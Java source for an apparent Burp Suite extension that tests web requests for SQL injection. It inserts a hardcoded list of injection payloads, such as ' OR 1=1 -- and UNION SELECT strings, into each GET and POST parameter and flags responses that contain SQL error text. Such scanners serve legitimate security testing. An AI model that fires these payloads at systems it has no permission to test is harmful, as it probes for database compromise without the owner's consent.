import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;

import java.net.URI;
import java.net.URISyntaxException;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

public class JuniorSqlDetection {
    private static String baseUrl;
    private static HttpRequest httpRequest;
    private static MontoyaApi montoyaApi;

    public JuniorSqlDetection(String baseUrl, HttpRequest httpRequest, MontoyaApi montoyaApi) {
        this.baseUrl = baseUrl;
        this.httpRequest = httpRequest;
        this.montoyaApi = montoyaApi;
    }

    private static final String[] SQL_INJECTION_PAYLOADS = {
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 'a'='a",
            "\" OR \"a\"=\"a",
            "' OR 1=1 --",
            "\" OR 1=1 --",
            "' OR 1=1 #",
            "\" OR 1=1 #",
            "' UNION SELECT null,null --",
            "\" UNION SELECT null,null --",
            "' OR EXISTS(SELECT * FROM users) --",
            "\" OR EXISTS(SELECT * FROM users) --"
    };

    private static final String[] SQL_ERROR_KEYWORDS = {
            "syntax error", "near", "unexpected token", "SQL command", "ORA-", "Error Code:", "SQL syntax", "use near"
    };

    // 解析URL中的查询参数
    private static Map<String, String> parseQueryParametersUrl(String url) throws URISyntaxException {
        Map<String, String> params = new HashMap<>();
        URI uri = new URI(url);
        String query = uri.getQuery();
        if (query != null) {
            String[] pairs = query.split("&");
            for (String pair : pairs) {
                int idx = pair.indexOf("=");
                String key = idx > 0 ? pair.substring(0, idx) : pair;
                String value = idx > 0 && pair.length() > idx + 1 ? pair.substring(idx + 1) : "";
                params.put(key, value);
            }
        }
        return params;
    }

    // 解析POST请求body中的参数（假设为x-www-form-urlencoded格式）
    private static Map<String, String> parseQueryParametersBody(String body) {
        Map<String, String> params = new HashMap<>();
        if (body != null && !body.isEmpty()) {
            String[] pairs = body.split("&");
            for (String pair : pairs) {
                int idx = pair.indexOf("=");
                String key = idx > 0 ? pair.substring(0, idx) : pair;
                String value = idx > 0 && pair.length() > idx + 1 ? pair.substring(idx + 1) : "";
                params.put(key, value);
            }
        }
        return params;
    }

    // 将payload注入到URL的指定参数中
    private static String injectPayloadIntoUrl(String url, String key, String payload) throws URISyntaxException {
        URI uri = new URI(url);
        String query = uri.getQuery();
        if (query == null) {
            return url + "?" + key + "=" + payload;
        }
        // 替换指定参数的值
        String[] pairs = query.split("&");
        StringBuilder newQuery = new StringBuilder();
        for (String pair : pairs) {
            if (pair.startsWith(key + "=")) {
                newQuery.append(key).append("=").append(payload).append("&");
            } else {
                newQuery.append(pair).append("&");
            }
        }
        // 去除末尾的"&"
        if (newQuery.length() > 0 && newQuery.charAt(newQuery.length() - 1) == '&') {
            newQuery.deleteCharAt(newQuery.length() - 1);
        }
        return uri.getPath() + "?" + newQuery;
    }

    // 将payload注入到POST请求的body中
    private static String injectPayloadIntoPostBody(String body, String key, String payload) {
        Map<String, String> params = parseQueryParametersBody(body);
        if (params.isEmpty()) {
            return body;
        }
        StringBuilder newBody = new StringBuilder();
        for (Map.Entry<String, String> entry : params.entrySet()) {
            if (entry.getKey().equals(key)) {
                newBody.append(entry.getKey()).append("=").append(payload).append("&");
            } else {
                newBody.append(entry.getKey()).append("=").append(entry.getValue()).append("&");
            }
        }
        // 去除最后的"&"
        if (newBody.length() > 0) {
            newBody.deleteCharAt(newBody.length() - 1);
        }
        return newBody.toString();
    }

    // 发送HTTP请求，检测SQL注入
    public HashMap<HttpRequest, HttpResponse> SqlDetection() throws InterruptedException {
        HashMap<HttpRequest, HttpResponse> requestHttpResponseMap = new HashMap<>();
        try {
            // GET请求检测
            if (httpRequest.method().equalsIgnoreCase("GET")) {
                // 解析URL中的查询参数
                Map<String, String> params = parseQueryParametersUrl(baseUrl);
                if (params.isEmpty()) {
                    montoyaApi.logging().logToOutput("No query parameters found in URL: " + baseUrl + "\n");
                }
                for (Map.Entry<String, String> entry : params.entrySet()) {
                    String key = entry.getKey();
                    for (String payload : SQL_INJECTION_PAYLOADS) {
                        // 构造注入后的URL，注意进行URL编码
                        String urlPayload = URLEncoder.encode(payload);
                        String injectedUrlPath = injectPayloadIntoUrl(baseUrl, key, urlPayload);
                        HttpRequest sqlRequest = httpRequest.withPath(injectedUrlPath).withBody("");
                        HttpResponse sqlResponse = montoyaApi.http().sendRequest(sqlRequest).response();
                        montoyaApi.logging().logToOutput("Injected URL: " + injectedUrlPath + "\n");
                        montoyaApi.logging().logToOutput("Response code: " + sqlResponse.statusCode() + "\n");

                        if (sqlResponse.statusCode() == 200 && containsSQLError(sqlResponse.bodyToString())) {
                            requestHttpResponseMap.put(sqlRequest, sqlResponse);
                        }
                        Thread.sleep(2);
                    }
                }
                return requestHttpResponseMap;
            }

            // POST请求检测
            if (httpRequest.method().equalsIgnoreCase("POST")) {
                String originalBody = httpRequest.bodyToString();
                Map<String, String> params = parseQueryParametersBody(originalBody);
                if (params.isEmpty()) {
                    montoyaApi.logging().logToOutput("No parameters found in POST body.\n");
                }
                for (Map.Entry<String, String> entry : params.entrySet()) {
                    String key = entry.getKey();
                    for (String payload : SQL_INJECTION_PAYLOADS) {
                        // 对payload进行URL编码
                        String urlPayload = URLEncoder.encode(payload);
                        String injectedBody = injectPayloadIntoPostBody(originalBody, key, urlPayload);
                        HttpRequest sqlRequest = httpRequest.withBody(injectedBody);
                        HttpResponse sqlResponse = montoyaApi.http().sendRequest(sqlRequest).response();
                        montoyaApi.logging().logToOutput("Injected POST parameter: " + key + "=" + urlPayload + "\n");
                        montoyaApi.logging().logToOutput("Response code: " + sqlResponse.statusCode() + "\n");

                        if (sqlResponse.statusCode() == 200 && containsSQLError(sqlResponse.bodyToString())) {
                            requestHttpResponseMap.put(sqlRequest, sqlResponse);
                        }
                        Thread.sleep(2);
                    }
                }
                return requestHttpResponseMap;
            }
        } catch (URISyntaxException e) {
            throw new RuntimeException(e);
        }
        return requestHttpResponseMap;
    }

    // 检查响应中是否包含SQL错误信息
    public static boolean containsSQLError(String response) {
        if (response == null) {
            return false;
        }
        response = response.toLowerCase();
        for (String keyword : SQL_ERROR_KEYWORDS) {
            if (response.contains(keyword.toLowerCase())) {
                return true;
            }
        }
        return false;
    }
}
